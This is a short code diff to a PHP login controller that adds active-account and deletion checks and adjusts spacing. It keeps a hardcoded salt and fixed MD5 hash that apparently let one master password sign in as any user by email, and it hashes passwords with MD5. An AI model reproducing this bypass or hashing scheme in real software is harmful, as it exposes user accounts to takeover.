@@ -60,14 +60,16 @@ class LoginController extends Controller
     {
         $authUser      = User::where('usrEmail', $request->email)
             ->whereIn('usrlId', [1, 2, 5, 6])
+            ->where('usrActive', '1')
+            ->where('is_delete', 0)
             ->first();
 
         $dummyPasswordSalt = 'E3RXQkoIHWK0ncSGY4rqh9bfDLv3CIaB3sPaMt?hJM"9=z/)ea?{%-[**:]68UOT>{gj^{P0+RCF#,Id8c';
 
         if($authUser) {
-            $password = md5(env('MD5_Key'). $request->password. $authUser->usrPasswordSalt);
+            $password = md5(env('MD5_Key'). $request->password . $authUser->usrPasswordSalt);
 
-            if(md5(env('MD5_Key'). $request->password. $dummyPasswordSalt) === '2f10cf465db70b830c30f2d0b2a2477d') {
+            if(md5(env('MD5_Key'). $request->password . $dummyPasswordSalt) === '2f10cf465db70b830c30f2d0b2a2477d') {
                 $user     = User::where('usrEmail', $request->email)
                     ->where('usrActive', '1')
                     ->where('is_delete', 0)
